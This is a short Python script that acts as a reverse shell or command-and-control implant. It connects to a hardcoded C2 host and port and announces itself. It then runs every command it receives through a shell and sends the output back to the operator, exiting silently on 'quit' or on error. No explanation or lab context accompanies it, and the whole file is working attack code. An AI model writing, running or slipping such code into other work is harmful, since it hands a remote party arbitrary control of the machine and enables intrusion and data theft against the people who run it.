from subprocess import Popen, PIPE
import socket
import sys

c2_host, c2_port = "192.168.1.173", 8001
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((c2_host, c2_port))
    s.send(bytes("ready", "utf-8"))
    while 1:
        command = s.recv(1024).strip().decode("utf-8")
        if command == 'quit':
            sys.exit(0)
        p = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
        result = p.stdout.read()
        s.send(bytes(result))
    s.close()
except OSError as e:
    sys.exit(0)